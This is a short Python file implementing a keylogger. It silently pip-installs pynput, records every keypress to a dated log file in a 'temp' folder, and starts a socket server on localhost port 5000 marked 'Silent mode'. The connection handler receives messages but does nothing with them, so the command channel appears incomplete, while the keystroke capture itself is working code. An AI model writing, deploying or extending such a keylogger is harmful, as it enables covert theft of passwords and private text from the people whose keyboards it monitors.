import logging
import os
import time
import threading
import socket
try:
    from pynput.keyboard import Key, Listener
except ModuleNotFoundError:
    os.system("pip install pynput > NUL > NUL")
    from pynput.keyboard import Key, Listener

# CONSTANTS
FOLDERNAME = "temp"

HEADER = 64
PORT = 5000
SERVER = "127.0.0.1"
ADDR = (SERVER, PORT)
FORMAT = "utf-8"
DISCONNECTED_MESSAGE = "DISCONNECT"


try:
    os.mkdir(FOLDERNAME)
except FileExistsError:
    pass

logging.basicConfig(filename=f"{FOLDERNAME}/{time.strftime('%Y-%m-%d')}.txt", level=logging.DEBUG, format=" %(asctime)s - %(message)s")


def loggingThread():
    def onPress(key):
        logging.info(str(key))

    with Listener(on_press=onPress) as listener:
        listener.join()



logthread = threading.Thread(target=loggingThread)
logthread.start()


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def handleConnection(conn, addr):
    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)



def main():
    # Silent mode
    server.listen()
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handleConnection, args=(conn, addr))
        thread.start()


if __name__ == "__main__":
    main()